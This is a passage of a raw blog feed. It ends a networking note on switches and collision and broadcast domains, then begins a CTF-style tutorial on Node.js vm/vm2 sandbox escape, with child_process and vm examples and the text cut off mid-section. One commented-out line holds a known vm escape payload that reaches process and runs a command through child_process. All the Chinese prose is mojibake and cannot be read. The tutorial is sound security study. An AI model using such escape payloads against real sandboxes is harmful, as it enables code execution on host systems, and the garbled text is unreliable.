alt="image-20240401235818631"></p><p><strong>ä»¥å¤ªç½‘äº¤æ¢æœºçš„ä¸¤ç§äº¤æ¢æ–¹å¼</strong></p><ul><li><p>ç›´é€šå¼äº¤æ¢æœºï¼šæŸ¥å®Œç›®çš„åœ°å€(6B)å°±ç«‹åˆ»è½¬å‘ã€‚</p><p>å»¶è¿Ÿå°ï¼Œå¯é æ€§ä½ï¼Œæ— æ³•æ”¯æŒå…·æœ‰ä¸åŒé€Ÿç‡çš„ç«¯å£çš„äº¤æ¢ã€‚</p></li><li><p>å­˜å‚¨è½¬å‘å¼äº¤æ¢æœºï¼šå°†å¸§æ”¾å…¥é«˜é€Ÿç¼“å­˜ï¼Œå¹¶æ£€æŸ¥å¦æ­£ç¡®ï¼Œæ­£ç¡®åˆ™è½¬å‘ï¼Œé”™è¯¯åˆ™ä¸¢å¼ƒã€‚<br>å»¶è¿Ÿå¤§ï¼Œå¯é æ€§é«˜ï¼Œå¯ä»¥æ”¯æŒå…·æœ‰ä¸åŒé€Ÿç‡çš„ç«¯å£çš„äº¤æ¢ã€‚</p></li></ul><p><strong>äº¤æ¢æœºçš„è‡ªå­¦ä¹ </strong></p><p><img src="http://cdn.clown2024.cn/202407151539825.png" alt="image-20240402000240493"></p><h2 id="å†²çªåŸŸå’Œå¹¿æ’­åŸŸ"><a href="#å†²çªåŸŸå’Œå¹¿æ’­åŸŸ" class="headerlink" title="å†²çªåŸŸå’Œå¹¿æ’­åŸŸ"></a>å†²çªåŸŸå’Œå¹¿æ’­åŸŸ</h2><p><strong>å†²çªåŸŸ</strong></p><p>åœ¨åŒä¸€ä¸ªå†²çªåŸŸä¸­çš„æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½èƒ½æ”¶åˆ°æ‰€æœ‰è¢«å‘é€çš„å¸§ï¼›ç®€å•çš„è¯´å°±æ˜¯åŒä¸€æ—¶é—´å†…åªèƒ½æœ‰ä¸€å°è®¾å¤‡å‘é€ä¿¡æ¯çš„èŒƒå›´ã€‚</p><p><strong>å¹¿æ’­åŸŸ</strong></p><p>ç½‘ç»œä¸­èƒ½æ¥æ”¶ä»»ä¸€è®¾å¤‡å‘å‡ºçš„å¹¿æ’­å¸§çš„æ‰€æœ‰è®¾å¤‡çš„é›†åˆã€‚ç®€å•çš„è¯´å¦‚æœç«™ç‚¹å‘å‡ºä¸€ä¸ªå¹¿æ’­ä¿¡å·ï¼Œæ‰€æœ‰èƒ½æ¥æ”¶æ”¶åˆ°è¿™ä¸ªä¿¡å·çš„è®¾å¤‡èŒƒå›´ç§°ä¸ºä¸€ä¸ªå¹¿æ’­åŸŸã€‚</p><p><img src="http://cdn.clown2024.cn/202407151539826.png" alt="image-20240402000502481"></p>]]></content>
      
      
      <categories>
          
          <category> åŸºç¡€,è®¡ç½‘ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¡ç½‘ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vm2æ²™ç®±é€ƒé€¸</title>
      <link href="/2024/03/09/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
      <url>/2024/03/09/vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
      
        <content type="html"><![CDATA[<!-- toc --><ul><li><a href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9A%84%E6%A6%82%E5%BF%B5">æ²™ç®±é€ƒé€¸çš„æ¦‚å¿µ</a></li><li><a href="#nodejs%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C">Nodejså‘½ä»¤æ‰§è¡Œ</a></li><li><a href="#vm%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8">vmæ²™ç®±é€ƒé€¸</a><ul><li><a href="#vm%E6%A8%A1%E5%9D%97%E7%9A%84%E4%BD%BF%E7%94%A8">vmæ¨¡å—çš„ä½¿ç”¨</a></li><li><a href="#%E5%88%A9%E7%94%A8%E6%B2%99%E7%AE%B1%E6%9D%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4">åˆ©ç”¨æ²™ç®±æ¥æ‰§è¡Œå‘½ä»¤</a></li><li><a href="#vm%E7%BB%95%E8%BF%87objectcreatenull">vmç»•è¿‡Object.create(null)</a></li></ul></li><li><a href="#vm2%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8">vm2æ²™ç®±é€ƒé€¸</a></li><li><a href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90">é¢˜ç›®åˆ†æ</a><ul><li><a href="#hfctf2020justescape">[HFCTF2020]JustEscape</a></li></ul></li></ul><!-- tocstop --><h1 id="æ²™ç®±é€ƒé€¸çš„æ¦‚å¿µ"><a href="#æ²™ç®±é€ƒé€¸çš„æ¦‚å¿µ" class="headerlink" title="æ²™ç®±é€ƒé€¸çš„æ¦‚å¿µ"></a>æ²™ç®±é€ƒé€¸çš„æ¦‚å¿µ</h1><ul><li>æ²™ç®±(sandbox)å°±æ˜¯åˆ›å»ºä¸€ä¸ªå•ç‹¬çš„è¿è¡Œä»£ç çš„ç¯å¢ƒï¼Œå’Œä¸»æœºè¿›è¡Œéš”ç¦»ï¼Œè¿™æ ·ä»£ç äº§ç”Ÿçš„å±å®³å°±ä¸ä¼šå½±å“åˆ°ä¸»æœºï¼Œæ²™ç®±çš„å·¥ä½œæœºåˆ¶ä¸»è¦æ˜¯ä¾é é‡å®šå‘ï¼Œå°†æ¶æ„ä»£ç çš„æ‰§è¡Œç›®æ ‡é‡å®šå‘åˆ°æ²™ç®±å†…éƒ¨ã€‚</li><li>æ²™ç®±ï¼ˆsandboxï¼‰å’Œ è™šæ‹Ÿæœºï¼ˆVMï¼‰å’Œ å®¹å™¨ï¼ˆDockerï¼‰ä¹‹é—´çš„åŒºåˆ«ï¼šsandboxå’ŒVMä½¿ç”¨çš„éƒ½æ˜¯è™šæ‹ŸåŒ–æŠ€æœ¯ï¼Œä½†äºŒè€…é—´ä½¿ç”¨çš„ç›®çš„ä¸ä¸€æ ·ã€‚æ²™ç®±ç”¨æ¥éš”ç¦»æœ‰å®³ç¨‹åºï¼Œè€Œè™šæ‹Ÿæœºåˆ™å®ç°äº†æˆ‘ä»¬åœ¨ä¸€å°ç”µè„‘ä¸Šä½¿ç”¨å¤šä¸ªæ“ä½œç³»ç»Ÿçš„åŠŸèƒ½ã€‚Dockerå±äºsandboxçš„ä¸€ç§ï¼Œé€šè¿‡åˆ›é€ ä¸€ä¸ªæœ‰è¾¹ç•Œçš„è¿è¡Œç¯å¢ƒå°†ç¨‹åºæ”¾åœ¨é‡Œé¢ï¼Œä½¿ç¨‹åºè¢«è¾¹ç•Œå›°ä½ï¼Œä»è€Œä½¿ç¨‹åºä¸ç¨‹åºï¼Œç¨‹åºä¸ä¸»æœºä¹‹é—´ç›¸äº’éš”ç¦»å¼€ã€‚åœ¨å®é™…é˜²æŠ¤æ—¶ï¼Œä½¿ç”¨Dockerå’ŒsandboxåµŒå¥—çš„æ–¹å¼æ›´å¤šä¸€ç‚¹ï¼Œå®‰å…¨æ€§ä¹Ÿæ›´é«˜ã€‚</li><li>Nodejsä¸­ï¼Œé€šè¿‡vmæ¨¡å—æ¥åˆ›å»ºä¸€ä¸ªæ²™ç®±ï¼Œä½†vmæ¨¡å—çš„æ¼æ´è¾ƒå¤§ï¼Œåç»­å°±å‡ºç°äº†å‡çº§ç‰ˆçš„vm2ï¼Œå¯¹vmåšäº†ä¼˜åŒ–ï¼Œä½†æ˜¯åœ¨æ—§ç‰ˆæœ¬ä»ç„¶å­˜åœ¨ä¸€äº›æ¼æ´ã€‚</li></ul><p>é‚£ä¹ˆæ²™ç®±é€ƒé€¸å°±æ˜¯å­—é¢æ„æ€ï¼Œé€ƒç¦»è¯¥æ²™ç®±ç¯å¢ƒå¯¹ä¸»æœºè¿›è¡Œå½±å“ï¼Œæ¯”å¦‚rceç­‰ã€‚</p><h1 id="nodejså‘½ä»¤æ‰§è¡Œ"><a href="#Nodejså‘½ä»¤æ‰§è¡Œ" class="headerlink" title="Nodejså‘½ä»¤æ‰§è¡Œ"></a>Nodejså‘½ä»¤æ‰§è¡Œ</h1><p>è¦è¿›è¡Œrceå°±è¦å…ˆäº†è§£ä¸€ä¸‹Nodejsçš„æ‰§è¡Œå‘½ä»¤çš„ä¸€äº›æ¨¡å—å’Œå‡½æ•°ã€‚</p><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.w3cschool.cn/nwfchn/omcvtozt.html">https://www.w3cschool.cn/nwfchn/omcvtozt.html</a></p><ul><li><p>eval()ï¼šè¿™ä¸ªå‡½æ•°è·Ÿphpçš„æ•ˆæœä¸€æ ·ï¼Œä¹Ÿæ˜¯ç›´æ¥å°†å­—ç¬¦ä¸²å½“ä½œä»£ç æ‰§è¡Œã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;console.log(&quot;hello&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure></li><li><p>child_processæ¨¡å—ï¼šè¯¥æ¨¡å—å°±æ˜¯nodejsç”¨æ¥æ‰§è¡Œå‘½ä»¤çš„æ¨¡å—</p><ul><li><p>exec()ï¼šè¯¥æ–¹æ³•ç”¨æ¥æ‰§è¡Œbashå‘½ä»¤</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> exec=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">exec</span>;<br><span class="hljs-keyword">var</span> whoami=<span class="hljs-title function_">exec</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">error, stdout, stderr</span>)&#123;<br>    <span class="hljs-keyword">if</span>(error)&#123;<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(error.<span class="hljs-property">stack</span>);<br>        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Error code: &#x27;</span>+error.<span class="hljs-property">code</span>);<br>    &#125;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;Child Process STDOUT: &#x27;</span>+stdout);<br>&#125;);<br><span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;console.log(&quot;hello&quot;)&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151754019.png" alt="image-20240309144449923"></p><p>execæ–¹æ³•çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ‰€è¦æ‰§è¡Œçš„shellå‘½ä»¤ï¼Œç¬¬äºŒä¸ªå‚æ•°æ˜¯å›è°ƒå‡½æ•°ï¼Œè¯¥å‡½æ•°æ¥å—ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯å‘ç”Ÿçš„é”™è¯¯ã€æ ‡å‡†è¾“å‡ºçš„æ˜¾ç¤ºç»“æœã€æ ‡å‡†é”™è¯¯çš„æ˜¾ç¤ºç»“æœã€‚</p></li><li><p>execFile()ï¼šè¯¥æ–¹æ³•ç›´æ¥æ‰§è¡Œç‰¹å®šçš„ç¨‹åºï¼Œå‚æ•°ä½œä¸ºæ•°ç»„ä¼ å…¥ï¼Œä¸ä¼šè¢«bashè§£é‡Šï¼Œå› æ­¤å…·æœ‰è¾ƒé«˜çš„å®‰å…¨æ€§ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> execFile=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">execFile</span>;<br><span class="hljs-title function_">execFile</span>(<span class="hljs-string">&#x27;/bin/ls&#x27;</span>,[<span class="hljs-string">&#x27;-l&#x27;</span>,<span class="hljs-string">&#x27;.&#x27;</span>],<span class="hljs-keyword">function</span>(<span class="hljs-params">error,result</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(result);<br>&#125;)<br></code></pre></td></tr></table></figure></li><li><p>spawn()ï¼šspawnæ–¹æ³•åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹æ¥æ‰§è¡Œç‰¹å®šå‘½ä»¤ï¼Œç”¨æ³•ä¸execFileæ–¹æ³•ç±»ä¼¼ï¼Œä½†æ˜¯æ²¡æœ‰å›è°ƒå‡½æ•°ï¼Œåªèƒ½é€šè¿‡ç›‘å¬äº‹ä»¶ï¼Œæ¥è·å–è¿è¡Œç»“æœã€‚å®ƒå±äºå¼‚æ­¥æ‰§è¡Œï¼Œé€‚ç”¨äºå­è¿›ç¨‹é•¿æ—¶é—´è¿è¡Œçš„æƒ…å†µã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs JS"><span class="hljs-keyword">var</span> spawn=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;child_process&#x27;</span>).<span class="hljs-property">spawn</span>;<br><span class="hljs-keyword">var</span> who=<span class="hljs-title function_">spawn</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br>who.<span class="hljs-property">stdout</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;stdout: &#x27;</span>+data);<br>&#125;);<br>who.<span class="hljs-property">stderr</span>.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">data</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;stderr: &#x27;</span>+data)<br>&#125;);<br>who.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;close&#x27;</span>,<span class="hljs-keyword">function</span>(<span class="hljs-params">code</span>)&#123;<br>    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;closing code: &#x27;</span>+code);<br>&#125;);<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151754020.png" alt="image-20240309145912479"></p><p>spawnæ–¹æ³•æ¥å—ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªæ˜¯å¯æ‰§è¡Œæ–‡ä»¶ï¼Œç¬¬äºŒä¸ªæ˜¯å‚æ•°æ•°ç»„ã€‚</p><p>spawnå¯¹è±¡è¿”å›ä¸€ä¸ªå¯¹è±¡ï¼Œä»£è¡¨å­è¿›ç¨‹ã€‚è¯¥å¯¹è±¡éƒ¨ç½²äº†EventEmitteræ¥å£ï¼Œå®ƒçš„dataäº‹ä»¶å¯ä»¥ç›‘å¬ï¼Œä»è€Œå¾—åˆ°å­è¿›ç¨‹çš„è¾“å‡ºç»“æœã€‚</p><p>spawnæ–¹æ³•ä¸execæ–¹æ³•éå¸¸ç±»ä¼¼ï¼Œåªæ˜¯ä½¿ç”¨æ ¼å¼ç•¥æœ‰åŒºåˆ«ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">child_process.<span class="hljs-title function_">exec</span>(command, [options], callback)<br>child_process.<span class="hljs-title function_">spawn</span>(command, [args], [options])<br></code></pre></td></tr></table></figure></li><li><p>fork()ï¼šforkæ–¹æ³•ç›´æ¥åˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹ï¼Œæ‰§è¡ŒNodeè„šæœ¬ï¼Œ<code>fork(&#39;./child.js&#39;)</code> ç›¸å½“äº <code>spawn(&#39;node&#39;, [&#39;./child.js&#39;])</code> ã€‚ä¸spawnæ–¹æ³•ä¸åŒçš„æ˜¯ï¼Œforkä¼šåœ¨çˆ¶è¿›ç¨‹ä¸å­è¿›ç¨‹ä¹‹é—´ï¼Œå»ºç«‹ä¸€ä¸ªé€šä¿¡ç®¡é“ï¼Œç”¨äºè¿›ç¨‹ä¹‹é—´çš„é€šä¿¡ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">var</span> n = child_process.<span class="hljs-title function_">fork</span>(<span class="hljs-string">&#x27;./child.js&#x27;</span>);<br>n.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">m</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;PARENT got message:&#x27;</span>, m);<br>&#125;);<br>n.<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">hello</span>: <span class="hljs-string">&#x27;world&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œforkæ–¹æ³•è¿”å›ä¸€ä¸ªä»£è¡¨è¿›ç¨‹é—´é€šä¿¡ç®¡é“çš„å¯¹è±¡ï¼Œå¯¹è¯¥å¯¹è±¡å¯ä»¥ç›‘å¬messageäº‹ä»¶ï¼Œç”¨æ¥è·å–å­è¿›ç¨‹è¿”å›çš„ä¿¡æ¯ï¼Œä¹Ÿå¯ä»¥å‘å­è¿›ç¨‹å‘é€ä¿¡æ¯ã€‚</p><p>child.jsè„šæœ¬çš„å†…å®¹å¦‚ä¸‹ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js">process.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-keyword">function</span>(<span class="hljs-params">m</span>) &#123;<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;CHILD got message:&#x27;</span>, m);<br>&#125;);<br>process.<span class="hljs-title function_">send</span>(&#123; <span class="hljs-attr">foo</span>: <span class="hljs-string">&#x27;bar&#x27;</span> &#125;);<br></code></pre></td></tr></table></figure><p>ä¸Šé¢ä»£ç ä¸­ï¼Œå­è¿›ç¨‹ç›‘å¬messageäº‹ä»¶ï¼Œå¹¶å‘çˆ¶è¿›ç¨‹å‘é€ä¿¡æ¯ã€‚</p></li><li><p>send()ï¼šä½¿ç”¨ child_process.fork() ç”Ÿæˆæ–°è¿›ç¨‹ä¹‹åï¼Œå°±å¯ä»¥ç”¨ child.send(message, [sendHandle]) å‘æ–°è¿›ç¨‹å‘é€æ¶ˆæ¯ã€‚æ–°è¿›ç¨‹ä¸­é€šè¿‡ç›‘å¬messageäº‹ä»¶ï¼Œæ¥è·å–æ¶ˆæ¯ã€‚ä¹Ÿå°±æ˜¯ä¸Šé¢forkç¤ºä¾‹çš„ä»£ç ã€‚</p></li></ul></li></ul><h1 id="vmæ²™ç®±é€ƒé€¸"><a href="#vmæ²™ç®±é€ƒé€¸" class="headerlink" title="vmæ²™ç®±é€ƒé€¸"></a>vmæ²™ç®±é€ƒé€¸</h1><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/13427?time__1311=mqmxnDBQqeu4lxGg2DyeHDkQdexWwhD&alichlgref=https://www.google.com/">NodeJs vmæ²™ç®±é€ƒé€¸ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com)</a></p><h2 id="vmæ¨¡å—çš„ä½¿ç”¨"><a href="#vmæ¨¡å—çš„ä½¿ç”¨" class="headerlink" title="vmæ¨¡å—çš„ä½¿ç”¨"></a>vmæ¨¡å—çš„ä½¿ç”¨</h2><ul><li><strong>vm.createContext([contextObject[, options]])</strong></li></ul><p>è¯¥æ¨¡å—åœ¨ä½¿ç”¨å‰éœ€è¦å…ˆåˆ›å»ºä¸€ä¸ªæ²™ç®±å¯¹è±¡ï¼Œå†å°†æ²™ç®±å¯¹è±¡ä¼ ç»™è¯¥æ–¹æ³•ï¼ˆå¦‚æœæ²¡æœ‰åˆ™ä¼šç”Ÿæˆä¸€ä¸ªç©ºçš„æ²™ç®±å¯¹è±¡ï¼‰ï¼Œv8å¼•æ“ä¸ºè¿™ä¸ªæ²™ç®±å¯¹è±¡åœ¨å½“å‰globalå¤–å†åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼Œæ­¤æ—¶è¿™ä¸ªæ²™ç®±å¯¹è±¡å°±æ˜¯è¿™ä¸ªä½œç”¨åŸŸçš„å…¨å±€å¯¹è±¡ï¼Œæ²™ç®±å†…éƒ¨æ— æ³•è®¿é—®globalä¸­çš„å±æ€§ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151754021.png" alt="image-20240309153446420"></p><ul><li><p>**vm.runInContext(code, contextifiedSandbox[, options])**ï¼šè¯¥å‡½æ•°å‚æ•°ä¸ºè¦æ‰§è¡Œçš„ä»£ç å’Œåˆ›å»ºå®Œä½œç”¨åŸŸçš„æ²™ç®±å¯¹è±¡ï¼Œä»£ç ä¼šåœ¨ä¼ å…¥çš„æ²™ç®±å¯¹è±¡çš„ä¸Šä¸‹æ–‡ä¸­æ‰§è¡Œï¼Œå¹¶ä¸”å‚æ•°çš„å€¼ä¸æ²™ç®±å†…çš„å‚æ•°å€¼ç›¸åŒã€‚</p><p>runInContextéœ€è¦é…åˆcreateContextåˆ›å»ºçš„æ²™ç®±æ¥è¿›è¡Œè¿è¡Œ</p></li><li><p>æ‰€ä»¥è¿™ä¸¤ä¸ªæ¨¡å—æ–¹æ³•é…åˆèµ·æ¥ä½¿ç”¨å¦‚ä¸‹ï¼š</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span>=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">const</span> sandbox=&#123;<span class="hljs-attr">globalVar</span>:<span class="hljs-number">10</span>&#125;;<br>vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>vm.<span class="hljs-title function_">runInContext</span>(<span class="hljs-string">&#x27;globalVar*=2;console.log(globalVar);&#x27;</span>,sandbox);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalVar);<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151754022.png" alt="image-20240309154253819"></p></li><li><p><strong>vm.runInThisContext(code[, options])</strong></p></li></ul><p>åœ¨å½“å‰globalä¸‹åˆ›å»ºä¸€ä¸ªä½œç”¨åŸŸï¼ˆsandboxï¼‰ï¼Œå¹¶å°†æ¥æ”¶åˆ°çš„å‚æ•°å½“ä½œä»£ç è¿è¡Œã€‚</p><p>è¿™é‡Œéœ€è¦æ³¨æ„çš„å°±æ˜¯runInThisContextè™½ç„¶æ˜¯ä¼šåˆ›å»ºç›¸å…³çš„æ²™ç®±ç¯å¢ƒï¼Œå¯ä»¥è®¿é—®åˆ°globalä¸Šçš„å…¨å±€å˜é‡ï¼Œä½†æ˜¯è®¿é—®ä¸åˆ°è‡ªå®šä¹‰çš„å˜é‡ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151754023.png" alt="image-20240309154545749"></p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm=<span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-variable language_">global</span>.<span class="hljs-property">globalVar</span>=<span class="hljs-number">5</span>;<br><span class="hljs-keyword">var</span> <span class="hljs-title class_">Var</span>=<span class="hljs-number">123</span>;<br>vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;console.log(globalVar);&#x27;</span>);<br>vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;console.log(Var);&#x27;</span>);<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151754024.png" alt="image-20240309154838701"></p><blockquote><p>å¯çŸ¥å¯ä»¥è®¿é—®å…¨å±€å˜é‡ï¼Œä½†è‡ªå®šä¹‰çš„ä¸èƒ½è®¿é—®ï¼Œä¼šæŠ¥é”™ã€‚</p></blockquote><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;vm&#x27;</span>);<br><span class="hljs-keyword">let</span> localVar = <span class="hljs-string">&#x27;initial value&#x27;</span>;<br><span class="hljs-keyword">const</span> vmResult = vm.<span class="hljs-title function_">runInThisContext</span>(<span class="hljs-string">&#x27;localVar = &quot;vm&quot;;&#x27;</span>);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;vmResult:&#x27;</span>, vmResult);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">&#x27;localVar:&#x27;</span>, localVar);<br><span class="hljs-comment">// vmResult: &#x27;vm&#x27;, localVar: &#x27;initial value&#x27;</span><br></code></pre></td></tr></table></figure><ul><li><strong>vm.runInNewContext(code[, contextObject[, options]])</strong></li></ul><p>creatContextå’ŒrunInContextçš„ç»“åˆç‰ˆï¼Œä¼ å…¥è¦æ‰§è¡Œçš„ä»£ç å’Œæ²™ç®±å¯¹è±¡ï¼Œä¸æä¾›çš„è¯é»˜è®¤ç”Ÿæˆä¸€ä¸ªæ²™ç®±æ¥è¿›è¡Œä½¿ç”¨ã€‚</p><blockquote><p>æä¸€å˜´Nodejsä¸­æ•°æ®ç±»å‹å¯ä»¥åˆ†ä¸ºä¸¤å¤§ç±»ï¼šåŸºæœ¬ç±»å‹å’Œå¯¹è±¡ç±»å‹</p><p>åŸºæœ¬ç±»å‹åŒ…æ‹¬ä»¥ä¸‹å…­ç§ï¼š</p><ul><li>stringï¼šè¡¨ç¤ºæ–‡æœ¬æ•°æ®ï¼Œç”¨å•å¼•å·æˆ–åŒå¼•å·åŒ…è£¹ï¼Œå¦‚ â€˜helloâ€™ æˆ– â€œworldâ€ã€‚</li><li>numberï¼šè¡¨ç¤ºæ•°å€¼æ•°æ®ï¼Œå¯ä»¥æ˜¯æ•´æ•°æˆ–å°æ•°ï¼Œå¦‚ 42 æˆ– 3.14ã€‚</li><li>booleanï¼šè¡¨ç¤ºé€»è¾‘æ•°æ®ï¼Œåªæœ‰ä¸¤ä¸ªå€¼ï¼Œtrue æˆ– falseã€‚</li><li>nullï¼šè¡¨ç¤ºç©ºå€¼ï¼Œè¡¨ç¤ºä¸€ä¸ªå¯¹è±¡æ²¡æœ‰å¼•ç”¨ä»»ä½•å€¼ã€‚</li><li>undefinedï¼šè¡¨ç¤ºæœªå®šä¹‰å€¼ï¼Œè¡¨ç¤ºä¸€ä¸ªå˜é‡æ²¡æœ‰è¢«èµ‹å€¼ã€‚</li><li>symbolï¼šè¡¨ç¤ºå”¯ä¸€çš„æ ‡è¯†ç¬¦ï¼Œç”¨ Symbol() å‡½æ•°åˆ›å»ºï¼Œå¦‚ Symbol(â€˜fooâ€™)ã€‚</li></ul><p>é‚£ä¹ˆé™¤äº†è¿™äº›åŸºæœ¬ç±»å‹çš„å°±æ˜¯å¯¹è±¡ç±»å‹äº†ã€‚</p></blockquote><ul><li><p><strong>new vm.Script(code, options)ï¼š</strong>åˆ›å»ºä¸€ä¸ªæ–°çš„vm.Scriptå¯¹è±¡åªç¼–è¯‘ä»£ç ä½†ä¸ä¼šæ‰§è¡Œå®ƒã€‚ç¼–è¯‘è¿‡çš„vm.Scriptæ­¤åå¯ä»¥è¢«å¤šæ¬¡æ‰§è¡Œã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œcodeæ˜¯ä¸ç»‘å®šäºä»»ä½•å…¨å±€å¯¹è±¡çš„ï¼ŒæŒ‡çš„æ˜¯ code ä¸­çš„å˜é‡ã€å‡½æ•°ã€å¯¹è±¡ç­‰ï¼Œä¸ä¼šè‡ªåŠ¨æˆä¸ºå…¨å±€ä½œç”¨åŸŸä¸­çš„å±æ€§æˆ–æˆå‘˜ã€‚ç›¸åï¼Œå®ƒä»…ä»…ç»‘å®šäºæ¯æ¬¡æ‰§è¡Œå®ƒçš„å¯¹è±¡ã€‚</p><figure class="highlight js"><table><tr><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">const</span> vm = <span class="hljs-built_in">require</span>(<span class="hljs-string">&quot;vm&quot;</span>);<br><span class="hljs-comment">//script=new vm.Script(&#x27;this.toString.constructor(&quot;return process&quot;)().mainModule.require(&quot;child_process&quot;).execSync(&quot;calc&quot;);&#x27;)</span><br>script=<span class="hljs-keyword">new</span> vm.<span class="hljs-title class_">Script</span>(<span class="hljs-string">&#x27;name=&quot;clown&quot;&#x27;</span>);<br><span class="hljs-keyword">const</span> sandbox = &#123;<span class="hljs-attr">name</span>:<span class="hljs-string">&quot;test&quot;</span>&#125;;<br><span class="hljs-keyword">const</span> context=vm.<span class="hljs-title function_">createContext</span>(sandbox);<br>script.<span class="hljs-title function_">runInContext</span>(context);<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(sandbox);<span class="hljs-comment">//&#123; name: &#x27;clown&#x27; &#125;</span><br></code></pre></td></tr></table></figure></li></ul><h2 id="åˆ©ç”¨æ²™ç®±æ¥æ‰§è¡Œå‘½ä»¤"><a href="#åˆ©ç”¨æ²™ç®±æ¥æ‰§è¡Œå‘½ä»¤" class="headerlink" title="åˆ©ç”¨æ²™ç®±æ¥æ‰§è¡Œå‘½ä»¤"></a>åˆ©ç”¨æ²™ç®±æ¥æ‰§è¡Œå‘½ä»¤</h2><p>è¿™é‡Œå†™ä¸€ä¸‹ä¸åŒæ²™ç®±æ‰§è¡Œå‘½ä»¤çš„å†™æ³•</p><ul><li><p><strong>runInThisContext</strong></p><figure class="highlight js"><table><tr><td 